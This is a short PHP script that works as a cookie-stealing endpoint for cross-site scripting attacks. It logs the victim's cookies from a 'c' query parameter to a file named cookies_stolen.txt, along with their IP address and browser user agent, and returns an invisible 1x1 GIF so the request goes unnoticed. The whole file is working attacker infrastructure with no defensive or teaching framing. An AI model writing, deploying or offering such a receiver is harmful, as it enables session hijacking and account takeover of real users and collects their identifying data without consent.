<?php
// Debug version: show errors and log all requests
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$file = __DIR__ . '/cookies_stolen.txt';
$cookieData = $_GET['c'] ?? '';

$entry = date('c') . ' | IP: ' . $_SERVER['REMOTE_ADDR'] . ' | UA: ' . ($_SERVER['HTTP_USER_AGENT'] ?? '-') . ' | DATA: ' . $cookieData . "\n";

if (file_put_contents($file, $entry, FILE_APPEND | LOCK_EX) === false) {
    http_response_code(500);
    echo "Failed to write to $file. Check permissions.";
} else {
    // Return a 1x1 transparent GIF
    header('Content-Type: image/gif');
    echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
}
?>
